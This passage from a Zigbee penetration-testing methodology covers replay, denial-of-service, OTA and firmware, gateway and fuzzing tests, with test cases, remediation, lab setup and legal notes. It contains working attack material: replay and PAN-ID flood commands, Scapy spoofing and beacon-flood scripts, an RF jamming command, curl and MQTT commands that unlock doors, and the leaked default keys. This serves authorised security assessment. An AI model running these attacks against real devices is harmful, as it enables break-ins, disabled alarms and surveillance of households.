| **Method** | Test each known cluster ID against target device (from CCS 2022 research) |
| **Tool** | Custom Python fuzzing script |
| **Expected Finding** | Device enters unresponsive state |

| TC-ZB-020 | APS Link Key Enforcement |
|-----------|--------------------------|
| **Objective** | Verify Door Lock and IAS clusters require APS-layer link key encryption |
| **Method** | Send commands with NWK encryption only (no APS key) |
| **Pass Criteria (secure):** | Device rejects NWK-only commands for sensitive clusters |

---

## 17. Phase 7 — Replay Attacks

### 17.1 Frame Counter Vulnerabilities

Zigbee's 32-bit frame counter prevents replay under normal operation. However:
- Factory reset resets frame counter to 0 → old captured frames valid for replay
- Some implementations don't properly persist frame counters across power cycles
- Frame counter values are visible in captured frames — used to determine "replay window"

```bash
# Capture legitimate command (e.g., door unlock)
zbdump -c 15 -w legitimate_unlock.pcap -t 10
# (Wait for user to manually unlock door)

# Verify frame counter in capture:
# Open in Wireshark → ZigBee Security Header → Frame Counter field
# Note the counter value N

# Replay: works if receiver's expected counter > N
# (Will fail on properly implemented devices due to counter check)
zbreplay -f legitimate_unlock.pcap -c 15

# Test after factory reset (counter reset to 0 → replay succeeds)
```

### 17.2 Forced Factory Reset + Replay

```bash
# Step 1: Capture legitimate commands with high frame counter
zbdump -c 15 -w commands.pcap -t 60

# Step 2: Force factory reset of target (touchlink or physical)
z3sec_touchlink reset_factory --target TARGET_EUI --channel 15 --sdr

# Step 3: Replay captured commands (counter now reset to 0, old frames may be valid)
zbreplay -f commands.pcap -c 15
```

### 17.3 ACK Suppression + Replay

ZigDiggity's ACK attack suppresses ACKs to make the sender believe packets are not received, allowing the attacker to replay the captured frames:

```bash
python3 ack_attack.py -c 15 --target TARGET_SHORT_ADDR
# While attack is running, inject replayed frames
```

### Test Cases — Phase 7

| TC-ZB-021 | Frame Counter Replay Test |
|-----------|--------------------------|
| **Objective** | Verify device rejects replayed frames |
| **Method** | Capture commands; replay immediately and after delay |
| **Tool** | KillerBee zbreplay |
| **Pass Criteria (secure):** | All replayed frames rejected |
| **Fail (vulnerable):** | Replayed commands executed |

| TC-ZB-022 | Post-Reset Replay |
|-----------|------------------|
| **Objective** | Test replay after factory reset resets frame counter |
| **Method** | Capture → reset device → replay |
| **Expected Finding** | Vulnerable if counter not seeded properly after reset |
| **Remediation** | Persist last-seen counter to NVM; use random initial counter |

---

## 18. Phase 8 — Denial of Service Attacks

### 18.1 PAN ID Conflict Flood (Network Destroyer)

**⚠️ EXTREME CAUTION:** This attack affects ALL Zigbee networks on the channel, not just the target. Use only in isolated RF environments (Faraday cage) or ensure no non-target Zigbee networks are in range.

```bash
# KillerBee zbpanidconflictflood
# Requires TWO KillerBee interfaces
zbpanidconflictflood -c 15 -i /dev/ttyUSB0 -j /dev/ttyUSB1

# One interface sniffs beacons (captures PAN IDs)
# Second interface continuously sends beacon packets with discovered PAN IDs
# Coordinator believes there's a PAN ID conflict → triggers realignment
# Process repeats → network fragments and collapses within seconds
# 
# WARNING: Destroys ALL Zigbee networks within RF range on the channel
# Use ONLY in Faraday-shielded enclosure during authorized testing
```

**Impact:** Total network failure within seconds; all devices lose communication; requires full network reformation to recover.

### 18.2 ACK Spoofing Attack (ZigDiggity)

```bash
# Suppress ACK responses to/from specific device
# Target device believes network is unreachable → stops communicating
python3 ack_attack.py -c 15 --target TARGET_SHORT_ADDR --pan_id 0xABCD

# More targeted: intercept ACKs from coordinator to specific device
# Effect: Device retransmits indefinitely → drains battery; controller marks device offline
```

### 18.3 Disassociation Spoofing

```python
# Send disassociation request spoofed from coordinator
# Target device disconnects from network
from scapy.layers.dot15d4 import *

disassoc = Dot15d4FCS() / \
           Dot15d4Data(fcf_destaddrmode=2, fcf_srcaddrmode=2,
                      dest_panid=TARGET_PAN, dest_addr=TARGET_SHORT,
                      src_panid=TARGET_PAN, src_addr=0x0000) / \
           Dot15d4Cmd(cmd_id=0x02) / \
           Dot15d4CmdDisassociation(disassociation_reason=0x02)
           # 0x02 = Coordinator wishes device to leave network

kb.inject(bytes(disassoc))
```

### 18.4 Beacon Flood

```python
# Flood target channel with beacon frames to saturate medium
# Legitimate communications degraded due to CSMA-CA collision
import threading

def beacon_flood_worker(channel, pan_id):
    kb = KillerBee(device='/dev/ttyUSBX')
    kb.set_channel(channel)
    
    beacon = Dot15d4FCS() / Dot15d4Beacon(sf_beaconorder=15, sf_assocpermit=1,
                                           src_panid=pan_id, src_addr=0x0000)
    while True:
        kb.inject(bytes(beacon))
        time.sleep(0.001)

# Start flood
t = threading.Thread(target=beacon_flood_worker, args=(15, 0xABCD))
t.start()
```

### 18.5 Orphan Notification Spoofing

```bash
# KillerBee zborphannotify
# Spoofs orphan notification from target device to coordinator
# Tests coordinator's response to unexpected orphan notifications
zborphannotify -c 15 --src TARGET_EUI --dst 0x0000 --pan TARGET_PAN
```

### Test Cases — Phase 8

| TC-ZB-023 | PAN ID Conflict Flood (Isolated) |
|-----------|----------------------------------|
| **Objective** | Test network resilience to PAN ID conflict flooding |
| **Method** | Execute zbpanidconflictflood in Faraday-shielded environment |
| **Tool** | KillerBee zbpanidconflictflood × 2 interfaces |
| **⚠️ WARNING** | Destroys ALL Zigbee within range — Faraday cage REQUIRED |
| **Expected Finding** | Network collapses within seconds; requires manual reformation |
| **CVSS Score** | 7.5 (High) — requires RF proximity |

| TC-ZB-024 | ACK Suppression DoS |
|-----------|---------------------|
| **Objective** | Isolate specific device from network via ACK suppression |
| **Tool** | ZigDiggity ack_attack.py |
| **Expected Finding** | Device marked offline by controller; stops sending alarms/events |
| **Remediation** | ACK suppression detection; multi-path routing; device monitoring |

| TC-ZB-025 | Disassociation Spoofing |
|-----------|------------------------|
| **Objective** | Disconnect device from network via spoofed disassociation |
| **Method** | Send disassociation command spoofing coordinator's address |
| **Expected Finding** | Device disconnects from network |
| **Remediation** | APS-layer authentication for management commands |

| TC-ZB-026 | Battery Drain via Wakeup Flood |
|-----------|-------------------------------|
| **Objective** | Drain battery of end device by preventing sleep |
| **Method** | Continuously send frames to sleeping device, forcing wakeup |
| **Expected Finding** | Battery-powered device depleted significantly faster than normal |

---

## 19. Phase 9 — Firmware & OTA Attacks

### 19.1 Zigbee OTA Upgrade Cluster (0x0019)

Zigbee defines a standard OTA firmware update mechanism. Insecure implementations may accept unsigned or downgraded firmware.

```python
# Test OTA upgrade security using ZCL OTA cluster
# Step 1: Enumerate OTA server presence
ota_query = ZCLReadAttributesReq(
    cluster=0x0019,
    attribs=[0x0000,  # Upgrade server IEEE address
             0x0001,  # File offset
             0x0002,  # Current file version
             0x0003,  # Current zigbee stack version
             0x0006,  # Image upgrade status
             0x0007]  # Manufacturer ID
)

# Step 2: Check if OTA image has signature verification
# Look for: ZCL OTA Image Header signature field (mandatory in secure implementations)
# OTA Image Header structure:
# - OTA upgrade file identifier: 0x0BEEF11E
# - Header version: 0x0100
# - Header length
# - Field control (signature present: bit 2)
# - Manufacturer code
# - Image type
# - File version (MUST be higher than current)
# - Zigbee stack version
# - Header string (32 bytes)
# - Total image size
# [Optional] Signer IEEE address + signature (ECDSA-P256 in secure impl.)

# Step 3: Attempt to send modified firmware via OTA
```

### 19.2 Philips Hue Worm (CVE Research Reference)

In 2020, Check Point Research demonstrated a Zigbee-based worm targeting Philips Hue bulbs:
1. **Initial vector:** Bug in Atmel's ZLL touchlink implementation allowed touchlink from hundreds of meters
2. **Device theft:** Attacker steals bulb from its network to attacker network
3. **Unsigned OTA:** Philips did not require signed firmware → malicious firmware installed
4. **Worm propagation:** Infected bulb re-joined victim networks and spread malware via Zigbee OTA

```bash
# Test for Philips Hue CVE-2020-6007 / touchlink range vulnerability
# Scan for Hue bulbs from extended range
z3sec_touchlink scan --channel 11 --sdr
# If responding from beyond normal touchlink range → vulnerable

# Verify OTA signature enforcement
# Attempt to push modified OTA image to device
# If accepted without valid signature → CRITICAL vulnerability
```

### 19.3 Physical Firmware Extraction

**TI CC2531 (most common Zigbee chip):**
```bash
# Method 1: CC Debugger (official TI tool)
# Connect CC Debugger to CC2531 debug pins (DD/DC)
# Use SmartRF Flash Programmer to read flash

# Method 2: CC2531 via OpenOCD + JTAG adapter
openocd -f interface/jlink.cfg -f target/cc2531.cfg
# In OpenOCD telnet:
telnet localhost 4444
> halt
> dump_image firmware.bin 0x00000000 0x40000  # 256KB flash
> exit

# Method 3: If debug interface locked (JEN protected):
# Attempt mass erase (loses data but unlocks)
# Or advanced power glitching

# Analyze extracted firmware
binwalk -e firmware.bin
strings firmware.bin | grep -E "(key|password|secret)"
# Z-Stack NWK key storage location varies by SDK version (search for "NWK_KEY" string)
```

**TI CC2652R (newer chip, ARM Cortex-M4):**
```bash
# J-Link SWD connection
JLinkExe -device CC2652R1F -if SWD -speed 4000
J-Link> connect
J-Link> halt
# Check if flash protection enabled:
# Read CCFG register to determine if debug lock is set
J-Link> mem32 0x50003F00 1   # CCFG base address
# If bit indicates "lock", attempt unlock mass erase
J-Link> erase
J-Link> exit
```

### Test Cases — Phase 9

| TC-ZB-027 | OTA Firmware Signature Verification |
|-----------|-------------------------------------|
| **Objective** | Verify device rejects unsigned or improperly signed OTA images |
| **Method** | Prepare modified OTA image; attempt push via authorized coordinator |
| **Expected Finding** | Secure: rejected; Vulnerable: accepted and flashed |
| **CVSS Score** | 9.8 (Critical) if successful — allows persistent device compromise |
| **Remediation** | ECDSA-P256 OTA image signing; version check in bootloader |

| TC-ZB-028 | OTA Downgrade Prevention |
|-----------|--------------------------|
| **Objective** | Verify device rejects OTA images with lower version number |
| **Method** | Attempt OTA update with older firmware |
| **Expected Finding** | Secure: downgrade rejected |

| TC-ZB-029 | Debug Interface Security (Production Devices) |
|-----------|----------------------------------------------|
| **Objective** | Verify JTAG/SWD debug interface is disabled on production hardware |
| **Method** | Connect J-Link/CC Debugger; attempt memory read |
| **Expected Finding** | Secure: "Flash locked" or "Secured" response |
| **Pass Criteria:** | Debug access prevented without mass erase |

---

## 20. Phase 10 — Physical Layer & Hardware Attacks

### 20.1 RF Fingerprinting & Device Identification

```python
# Build device fingerprint from unencrypted frame metadata
import pandas as pd
from collections import defaultdict

device_profiles = defaultdict(list)

def fingerprint_device(eui64, frame):
    """Build behavioral fingerprint from unencrypted metadata"""
    profile = {
        'eui64': eui64,
        'vendor': get_oui(eui64[:3]),  # First 3 bytes = OUI
        'tx_interval': compute_interval(eui64),
        'frame_sizes': [len(frame)],
        'cluster_ids': extract_clusters(frame),
        'lqi_rssi': frame.get('lqi', 0)
    }
    device_profiles[eui64].append(profile)

# OUI lookup reveals manufacturer from EUI-64 first 3 bytes
# 00:17:88 = Philips Hue
# 00:0D:6F = Faro Technologies (many Zigbee devices)
# 00:12:4B = Texas Instruments
# 00:15:8D = Aqara/LUMI
```

### 20.2 Selective Jamming

Channel-specific jamming at 2.4 GHz using SDR:

```bash
# Selective channel jammer with HackRF (in authorized Faraday environment)
# Zigbee channel 15 = 2425 MHz
hackrf_transfer -t /dev/zero -f 2425000000 -s 4000000 -x 40

# Channel → Frequency mapping:
# Ch11=2405, Ch12=2410, Ch13=2415, Ch14=2420, Ch15=2425
# Ch16=2430, Ch17=2435, Ch18=2440, Ch19=2445, Ch20=2450
# Ch21=2455, Ch22=2460, Ch23=2465, Ch24=2470, Ch25=2475, Ch26=2480 (MHz)

# ⚠️ ALL 2.4 GHz JAMMING IS ILLEGAL ON PUBLIC FREQUENCIES
# Use ONLY in RF-shielded (Faraday cage) authorized test environment
```

### 20.3 Traffic Analysis (No Decryption Needed)

```python
# Metadata analysis reveals sensitive information without decryption
# Occupancy inference from door lock event timing
import datetime

def analyze_lock_activity(pcap_file):
    events = []
    for pkt in rdpcap(pcap_file):
        if ZigbeeAppDataPayload in pkt:
            if pkt[ZigbeeAppDataPayload].cluster == 0x0101:  # Door Lock
                events.append({
                    'time': datetime.datetime.fromtimestamp(pkt.time),
                    'src': pkt[ZigbeeNWK].source,
                    'dst': pkt[ZigbeeNWK].destination,
                    'encrypted': bool(pkt[ZigbeeNWK].flags & 0x02)
                })
    # Pattern analysis reveals occupancy schedule, family size, routine
    return events
```

### Test Cases — Phase 10

| TC-ZB-030 | EUI-64 MAC Address Privacy |
|-----------|---------------------------|
| **Objective** | Assess privacy implications of permanently visible EUI-64 |
| **Method** | Collect EUI-64s from passive scan; correlate with OUI to identify devices |
| **Expected Finding** | All device manufacturer IDs and types visible without authentication |
| **Note** | This is an inherent Zigbee specification limitation |

| TC-ZB-031 | Traffic Pattern Analysis |
|-----------|--------------------------|
| **Objective** | Infer sensitive behavioral data from encrypted traffic metadata |
| **Method** | Capture 24–48 hours of metadata (src/dst, timing, cluster IDs) |
| **Expected Finding** | Occupancy patterns, routine inference, device behavioral signatures |

---

## 21. Phase 11 — Gateway, Hub & MQTT Exploitation

### 21.1 Zigbee2MQTT API Security

```bash
# Zigbee2MQTT exposes REST API and MQTT interface
# Default: no authentication on local network

# Enumerate devices via API
curl http://192.168.1.X:8080/api/devices

# Send unauthorized command to device
curl -X POST http://192.168.1.X:8080/api/devices/DEVICE_IEEE/set \
  -H "Content-Type: application/json" \
  -d '{"state": "OFF"}'

# For door locks:
curl -X POST http://192.168.1.X:8080/api/devices/LOCK_IEEE/set \
  -H "Content-Type: application/json" \
  -d '{"state": "UNLOCK"}'

# MQTT direct publish (unauthenticated broker)
mosquitto_pub -h 192.168.1.X -p 1883 \
  -t "zigbee2mqtt/front_door_lock/set" \
  -m '{"state": "UNLOCK"}'
```

### 21.2 deCONZ REST API

```bash
# deCONZ exposes a REST API on port 80 (default, no auth on LAN by default)
# Discover lights and sensors
curl http://192.168.1.X:80/api/APIKEY/lights
curl http://192.168.1.X:80/api/APIKEY/sensors

# Control light (PUT)
curl -X PUT http://192.168.1.X:80/api/APIKEY/lights/1/state \
  -H "Content-Type: application/json" \
  -d '{"on": false}'

# Test for unauthenticated API access (missing API key)
curl http://192.168.1.X:80/api//lights    # Empty API key
```

### 21.3 Home Assistant Zigbee Integration

```bash
# Home Assistant Zigbee JS integration
# Test for authentication bypass on local network
curl -H "Authorization: Bearer INVALID_TOKEN" \
  http://192.168.1.X:8123/api/states/sensor.door_lock

# Check if long-lived access tokens are properly required
# Test CSRF on web interface
```

### 21.4 Zigbee Direct (BLE-Based, 2022+)

Zigbee Direct allows provisioning via Bluetooth LE, adding a new attack surface:

```bash
# Scan for Zigbee Direct devices (appear as BLE peripherals)
hcitool lescan
bluetoothctl scan on

# Look for: Zigbee Direct service UUID = 0xFFF8 in BLE advertisements

# Test for weak BLE pairing (Just Works vs Passkey)
# Use BLEsuite, Bettercap, or BTLE-Juice for BLE attacks
python3 -m blesuite ...
```

### Test Cases — Phase 11

| TC-ZB-032 | Zigbee2MQTT Authentication |
|-----------|---------------------------|
| **Objective** | Test for authentication enforcement on Zigbee2MQTT API |
| **Method** | Attempt device control without authentication token |
| **Tool** | curl, Burp Suite |
| **Pass Criteria (secure):** | API requires authentication; returns 401/403 |
| **Fail (vulnerable):** | Unauthenticated device control possible |

| TC-ZB-033 | MQTT Broker Security |
|-----------|---------------------|
| **Objective** | Test MQTT broker authentication and authorization |
| **Method** | Anonymous connection attempt; subscribe to all topics; publish commands |
| **Tool** | mosquitto_sub/pub |
| **Pass Criteria:** | Anonymous access rejected; ACLs enforced per topic |

| TC-ZB-034 | Hub Web Interface Security |
|-----------|---------------------------|
| **Objective** | Standard web application security assessment of Zigbee hub |
| **Method** | OWASP Top 10 testing against hub HTTP interface |
| **Tool** | Burp Suite, nikto, OWASP ZAP |

---

## 22. Phase 12 — Fuzzing Zigbee Implementations

### 22.1 Z-Fuzzer (Automated Zigbee Stack Fuzzer)

**GitHub:** https://github.com/zigbeeprotocol/Z-Fuzzer

```bash
git clone https://github.com/zigbeeprotocol/Z-Fuzzer
cd Z-Fuzzer
pip3 install -r requirements.txt

# Fuzz NWK layer
python3 zfuzzer.py --target Z-Stack --protocol NWK --duration 7200

# Fuzz APS layer
python3 zfuzzer.py --target Z-Stack --protocol APS --duration 7200

# Fuzz ZCL layer
python3 zfuzzer.py --target Z-Stack --protocol ZCL --duration 7200

# Results: crashes saved to ./crashes/
# Each crash file = test case that caused failure
```

### 22.2 Boofuzz for ZCL Fuzzing

```python
#!/usr/bin/env python3
# Fuzz Zigbee ZCL commands via Zigbee2MQTT REST API
from boofuzz import *
import requests

def send_zcl_command(target, fuzz_data):
    """Send fuzzed ZCL command via Zigbee2MQTT API"""
    try:
        requests.post(
            f"http://{target}:8080/api/devices/TARGET_IEEE/set",
            json={"cluster_id": fuzz_data.get('cluster_id', 0x0006),
                  "cmd_id": fuzz_data.get('cmd_id', 0x00),
                  "payload": fuzz_data.get('payload', '')},
            timeout=2
        )
    except Exception as e:
        print(f"[!] Exception (possible crash): {e}")

# Fuzz ZCL command parameters
session = Session()

# Define fuzzing primitives
s_initialize("zcl_fuzz")
s_group("cluster_id", values=[0x0006, 0x0101, 0x0201, 0x0500, 0x0501])
s_byte("cmd_id", value=0x00, fuzzable=True)
s_bytes("payload", value=b'\x00', size=8, fuzzable=True)

# Use boofuzz REST callbacks
session.connect(target=Target(
    connection=HttpConnection(host="192.168.1.X", port=8080)
))
session.fuzz()
```

### 22.3 Custom Frame Fuzzer

```python
#!/usr/bin/env python3
# Fuzz IEEE 802.15.4 / Zigbee NWK frame fields
from killerbee import *
from scapy.all import *
from scapy.layers.zigbee import *
import random

def zigbee_frame_fuzzer(channel, pan_id, target_addr):
    kb = KillerBee(device='/dev/ttyUSBX')
    kb.set_channel(channel)
    
    fuzz_cases = 0
    while True:
        # Fuzz NWK frame control fields
        nwk_ctrl = random.randint(0, 0xFFFF)
        frame_type = random.randint(0, 3)
        proto_ver = random.randint(0, 15)
        radius = random.randint(0, 255)
        
        # Fuzz APS header
        dst_ep = random.randint(0, 255)
        cluster = random.randint(0, 0xFFFF)
        aps_counter = random.randint(0, 255)
        
        # Fuzz payload
        payload = bytes([random.randint(0, 255) for _ in range(random.randint(0, 50))])
        
        try:
            frame = (Dot15d4FCS() /
                    Dot15d4Data(dest_panid=pan_id, dest_addr=target_addr) /
                    ZigbeeNWK(flags=nwk_ctrl, destination=target_addr,
                             proto_version=proto_ver, radius=radius) /
                    ZigbeeAppDataPayload(dst_endpoint=dst_ep, cluster=cluster,
                                        counter=aps_counter) /
                    Raw(payload))
            kb.inject(bytes(frame))
            fuzz_cases += 1
        except Exception:
            pass
        
        if fuzz_cases % 100 == 0:
            print(f"[*] Sent {fuzz_cases} fuzz cases")
        time.sleep(0.05)
```

### Test Cases — Phase 12

| TC-ZB-035 | Zigbee Stack Fuzzing (Z-Fuzzer) |
|-----------|--------------------------------|
| **Objective** | Identify crashes in target Zigbee stack implementation |
| **Method** | Run Z-Fuzzer against target firmware/device for 4+ hours |
| **Tool** | Z-Fuzzer |
| **Expected Finding** | Protocol handling bugs, assertion failures, memory corruption |

| TC-ZB-036 | ZCL Command Parameter Fuzzing |
|-----------|------------------------------|
| **Objective** | Identify crashes from malformed ZCL payloads |
| **Method** | Boofuzz or custom fuzzer targeting each cluster command |
| **Tool** | Boofuzz + Zigbee2MQTT API or direct KillerBee injection |

---

## 23. Complete Test Case Matrix

| TC ID | Phase | Test Name | Severity | Tools | Auth |
|-------|-------|-----------|---------|-------|------|
| TC-ZB-001 | Recon | Multi-Channel Passive Survey | Info | zbdump, zbstumbler | None |
| TC-ZB-002 | Crypto | Default Key Traffic Decryption | Critical | Wireshark, zbdsniff | None |
| TC-ZB-003 | Crypto | ZLL Master Key Decryption | High | Z3sec key_extract | None |
| TC-ZB-004 | Discovery | Active PAN Discovery | Low | zbstumbler -v | None |
| TC-ZB-005 | Discovery | ZDO Endpoint Enumeration | Low | KillerBee + Scapy | Partial |
| TC-ZB-006 | Discovery | ZCL Basic Cluster Fingerprinting | Low | KillerBee + Scapy | None |
| TC-ZB-007 | Crypto | NWK Key Interception During Join | Critical | zbdsniff, Z3sec | None (timing) |
| TC-ZB-008 | Crypto | Default TCLK Enforcement Check | Critical | KillerBee join test | Controller |
| TC-ZB-009 | Crypto | ZLL Master Key Exploitation | High | Z3sec | None |
| TC-ZB-010 | Crypto | Install Code Physical Security | Medium | Visual inspection | Physical |
| TC-ZB-011 | Touchlink | Factory Reset via Touchlink | High | Z3sec z3sec_touchlink | None |
| TC-ZB-012 | Touchlink | Device Theft via Touchlink | High | Z3sec | None |
| TC-ZB-013 | Touchlink | Long-Range Touchlink | High | Z3sec + USRP | None |
| TC-ZB-014 | Touchlink | Touchlink Disable Verification | Medium | Z3sec scan | None |
| TC-ZB-015 | Joining | Insecure Rejoin Test | High | ZigDiggity insecure_rejoin | None |
| TC-ZB-016 | Joining | Rogue Coordinator | High | KillerBee + Scapy | None |
| TC-ZB-017 | App Layer | Unauthenticated ZCL Injection | Critical | KillerBee + Scapy | None |
| TC-ZB-018 | App Layer | IAS Alarm Bypass | Critical | KillerBee + Scapy | None |
| TC-ZB-019 | App Layer | ZCL Communication Interruption | High | Custom Python | None |
| TC-ZB-020 | App Layer | APS Link Key Enforcement | High | KillerBee | None |
| TC-ZB-021 | Replay | Frame Counter Replay Test | High | zbreplay | None |
| TC-ZB-022 | Replay | Post-Reset Replay | High | zbreplay | None |
| TC-ZB-023 | DoS | PAN ID Conflict Flood | High | zbpanidconflictflood | None |
| TC-ZB-024 | DoS | ACK Suppression | High | ZigDiggity ack_attack | None |
| TC-ZB-025 | DoS | Disassociation Spoofing | Medium | Scapy | None |
| TC-ZB-026 | DoS | Battery Drain via Wakeup Flood | Medium | KillerBee | None |
| TC-ZB-027 | Firmware | OTA Signature Verification | Critical | Coordinator + modified OTA | Controller |
| TC-ZB-028 | Firmware | OTA Downgrade Prevention | High | Coordinator | Controller |
| TC-ZB-029 | Hardware | Debug Interface Security | High | J-Link/CC Debugger | Physical |
| TC-ZB-030 | Physical | EUI-64 Privacy Assessment | Low | zbstumbler | None |
| TC-ZB-031 | Physical | Traffic Pattern Analysis | Medium | zbdump | None |
| TC-ZB-032 | Gateway | Zigbee2MQTT Authentication | High | curl, Burp Suite | Network |
| TC-ZB-033 | Gateway | MQTT Broker Security | High | mosquitto | Network |
| TC-ZB-034 | Gateway | Hub Web Interface Security | High | Burp Suite, nikto | Network |
| TC-ZB-035 | Fuzzing | Zigbee Stack Fuzzing | High | Z-Fuzzer | None |
| TC-ZB-036 | Fuzzing | ZCL Parameter Fuzzing | Medium | Boofuzz | Network |

---

## 24. CVEs & Known Vulnerabilities

### 24.1 Major Published Vulnerabilities

| CVE / Name | Year | CVSS | Device/Vendor | Description |
|-----------|------|------|--------------|-------------|
| ZLL Master Key Leak | 2015 | N/A | All ZLL devices | ZLL Master Key leaked; permanent Touchlink security compromise |
| CVE-2016-5051 to 5059 | 2016 | 7.5–9.8 | OSRAM Lightify | Multiple Zigbee HA vulnerabilities in cloud + local interface |
| "Hue Over-the-Air" | 2020 | N/A | Philips Hue | Touchlink range exploit + unsigned OTA → network worm (Check Point Research) |
| Z-Fuzzer CVEs | 2022 | 7.5–8.2 | TI Z-Stack | 3 CVEs in Z-Stack from Z-Fuzzer; protocol handling bugs |
| "Don't Kick the Beehive" | 2022 | N/A | Multiple (10 devices) | 5 attack types including communication interruption, key exposure (ACM CCS 2022) |
| Rejoin Vulnerabilities | 2022 | N/A | Multiple | Zigbee rejoin procedure exploits (RAID 2022) |
| Zigbee Direct BLE | 2023+ | Under research | ZDD devices | BLE-based Zigbee Direct provisioning attack surface |

### 24.2 CVE Lookup

```bash
# Search NVD for Zigbee-specific CVEs
curl "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=zigbee&cvssV3Severity=HIGH" | \
  python3 -m json.tool

# Vendor-specific searches
# Texas Instruments Z-Stack: https://www.ti.com/product/CC2652R#security
# Silicon Labs EmberZNet: https://www.silabs.com/support/product-security
# Zigbee Alliance Security: https://csa-iot.org/developer-resource/security-notices/
```

---

## 25. Lab Setup Guide

### 25.1 Recommended Configuration

```
┌────────────────────────────────────────────────────────────────┐
│                   ZIGBEE PENTEST LAB                            │
├────────────────────────────────────────────────────────────────┤
│  Raspberry Pi 4 + RaspBee II                                   │
│  ├── Running: ZigDiggity, Zigbee2MQTT, deCONZ                  │
│  │                                                              │
│  ├── Target Devices (buy for testing):                          │
│  │   ├── Philips Hue bulb + bridge (ZLL + HA targets)          │
│  │   ├── Aqara door lock (Zigbee HA, ZCL Door Lock cluster)    │
│  │   ├── Aqara door/window sensor (IAS Zone cluster)            │
│  │   ├── SONOFF ZBMINIL2 switch (ZCL On/Off cluster)           │
│  │   └── Centralite alarm panel (IAS ACE cluster)              │
│  │                                                              │
│  └── Attack Station (Kali Linux):                               │
│      ├── ApiMote v4 (primary KillerBee hardware)               │
│      ├── CC2531 × 2 (KillerBee firmware + sniffer firmware)    │
│      ├── SONOFF CC2652P dongle (modern coordinator)            │
│      └── HackRF One (spectrum visualization)                   │
│                                                                  │
│  Faraday cage enclosure recommended                             │
└────────────────────────────────────────────────────────────────┘
```

### 25.2 Kali Linux Setup Script

```bash
#!/bin/bash
# Zigbee Penetration Testing Environment Setup

# System update
sudo apt-get update && sudo apt-get upgrade -y

# Core dependencies
sudo apt-get install -y python3 python3-pip python3-dev libusb-1.0-0 \
  libusb-dev python3-serial python3-usb libgcrypt-dev gnuradio \
  gr-osmosdr hackrf wireshark-qt git cmake tcpdump

# KillerBee
git clone https://github.com/riverloopsec/killerbee
cd killerbee
pip3 install pyserial pyusb pycryptodome scapy
sudo python3 setup.py install
cd ..

# ZigDiggity (for Raspberry Pi / RaspBee; run on Pi)
# git clone https://github.com/BishopFox/zigdiggity

# Z3sec
git clone https://github.com/IoTsec/Z3sec
cd Z3sec
sudo python3 setup.py install
# Edit ~/.config/z3sec/touchlink_crypt.ini after first run
cd ..

# Z-Fuzzer
git clone https://github.com/zigbeeprotocol/Z-Fuzzer
cd Z-Fuzzer
pip3 install -r requirements.txt
cd ..

# Zigator
pip3 install zigator

# GNU Radio IEEE 802.15.4 support
git clone https://github.com/bastibl/gr-ieee802-15-4
cd gr-ieee802-15-4 && mkdir build && cd build
cmake .. && make && sudo make install && sudo ldconfig
cd ../..

# Zigbee2MQTT via Docker
docker pull koenkk/zigbee2mqtt

# Test KillerBee installation
zbid

echo "[+] Zigbee pentest environment ready!"
```

### 25.3 Wireshark Zigbee Configuration

```
1. Open Wireshark
2. Edit → Preferences → Protocols → Zigbee NWK

Add decryption keys:
   Key: 5A6967426565416C6C69616E636530 39    Label: HA Default TCLK
   Key: 9F5595F10257C8A965370BC22A8B0244      Label: ZLL Leaked Master

3. Edit → Preferences → Protocols → Zigbee APS
   Add APS keys if obtained (pair-wise link keys)

4. Useful Wireshark display filters:
   zbee_nwk                               # All Zigbee NWK
   zbee_zcl.cluster_id == 0x0101          # Door Lock
   zbee_zcl.cluster_id == 0x0501          # IAS ACE (alarms)
   zbee_zcl.cluster_id == 0x0006          # On/Off
   zbee_nwk.security == 1                 # Encrypted frames
   zbee_nwk.security == 0                 # Unencrypted frames
   zbee_zdp                               # ZDO management frames
   !zbee_nwk.security                     # Find unencrypted commands
```

---

## 26. Reporting & Remediation

### 26.1 Risk Rating for Zigbee Findings

| Finding | CVSS Estimate | Priority | Remediation |
|---------|--------------|---------|-------------|
| Default TCLK in use | 9.1 (Critical) | P0 | Enforce install codes; update firmware |
| Unauthenticated actuator control | 9.8 (Critical) | P0 | Enable NWK + APS security for all actuators |
| ZLL Master Key touchlink | 8.8 (High) | P0 | Disable Touchlink; upgrade to centralized Zigbee 3.0 |
| NWK key extracted from join | 9.1 (Critical) | P0 | Install codes + unique per-device TCLKs |
| Unsigned OTA accepted | 9.8 (Critical) | P0 | ECDSA firmware signing |
| Insecure rejoin | 8.1 (High) | P1 | Disable unsecured rejoin |
| MQTT unauthenticated | 8.8 (High) | P1 | Enable MQTT auth + TLS |
| Debug interface unlocked | 7.5 (High) | P1 | Enable flash protection in production |
| Hub web auth weak | 7.5 (High) | P1 | Strong auth, HTTPS, MFA |
| APS layer security missing | 7.5 (High) | P2 | Enable APS link keys for sensitive CCs |
| Replay accepted | 7.5 (High) | P2 | Persistent frame counters; proper NVM |
| PAN ID conflict DoS | 6.5 (Medium) | P2 | Rate limiting; anomaly detection |
| EUI-64 privacy leak | 4.3 (Medium) | P3 | Accept as spec limitation; note in report |
| Install code label exposed | 5.3 (Medium) | P2 | Remove/destroy install code label post-pairing |

### 26.2 Zigbee Assessment Report Structure

```markdown
1. Executive Summary
   - Critical findings with business impact
   - Risk rating overview
   - Immediate remediation actions required

2. Methodology
   - Hardware/software tools used
   - Channels and PAN IDs in scope
   - Testing phases conducted
   - Limitations (e.g., Faraday cage required for some tests)

3. Network Topology Map
   - Channel, PAN ID, coordinator address
   - All discovered nodes (NodeID, EUI-64, device type, security level)
   - Cluster/capability map per device

4. Findings (per TC)
   - TC ID and title
   - Description + technical evidence
   - Affected devices/PAN IDs
   - CVSS score and vector
   - Proof of concept (pcap evidence, screenshots)
   - Business impact
   - Recommended remediation

5. Appendices
   - Raw packet captures (with sensitive keys redacted)
   - Device inventory
   - Firmware versions
   - Tool output logs
```

---

## 27. Legal & Ethical Framework

### 27.1 Regulatory Considerations

**United States:**
- FCC Part 15: Zigbee devices operate under unlicensed Part 15 — testing on your own equipment generally lawful
- 47 U.S.C. § 333: Jamming any RF transmission = Federal crime; Faraday cage testing only
- CFAA 18 U.S.C. § 1030: Computer fraud — unauthorized network access is illegal
- ECPA: Wireless interception requires authorization or lawful intercept

**European Union:**
- Radio Equipment Directive (RED): Governs Zigbee device certification
- GDPR: Captured traffic containing personal data must be handled per data protection obligations
- Cybersecurity Act / NIS2: Testing on critical infrastructure requires specific authorization

**Key principle:** The Zigbee frequency band is unlicensed, but that does not authorize accessing others' networks. Transmission requires staying within Part 15 power limits; intentional jamming is always illegal.

### 27.2 What Requires Written Authorization

